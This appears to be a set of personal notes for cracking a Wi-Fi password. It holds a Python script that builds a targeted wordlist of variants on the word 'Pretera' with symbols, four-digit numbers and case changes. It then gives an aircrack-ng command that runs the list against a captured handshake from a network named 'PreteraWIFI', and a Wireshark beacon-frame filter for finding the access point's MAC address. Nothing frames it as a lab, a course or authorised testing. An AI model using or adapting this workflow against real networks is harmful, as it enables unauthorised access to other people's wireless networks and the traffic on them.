```python 
import itertools

# Define components
base_word = "Pretera"
special_chars = "@!#$%&*"
numbers = [str(i).zfill(4) for i in range(10000)]  # 0000 to 9999

wordlist = []

# Generate variations
for char in special_chars:
    for num in numbers:
        wordlist.append(f"{base_word}{char}{num}")  # Pretera@1234
        wordlist.append(f"{base_word}{num}{char}")  # Pretera1234@
        wordlist.append(f"{char}{base_word}{num}")  # @Pretera1234
        wordlist.append(f"{char}{base_word}{char}{num}")  # @Pretera@1234
        wordlist.append(f"{base_word}{num}")  # Pretera1234
        wordlist.append(f"{base_word}{char}")  # Pretera@

# Generate uppercase/lowercase variations
wordlist += [w.upper() for w in wordlist]
wordlist += [w.lower() for w in wordlist]

# Save to file
with open("wordlist.txt", "w") as f:
    f.write("\n".join(wordlist))

print(f"Wordlist generated with {len(wordlist)} entries: wordlist.txt")
```


sudo aircrack-ng -w wordlist.txt -b MAC PreteraWIFI.cap
for mac address
wlan.fc.type_subtype == 8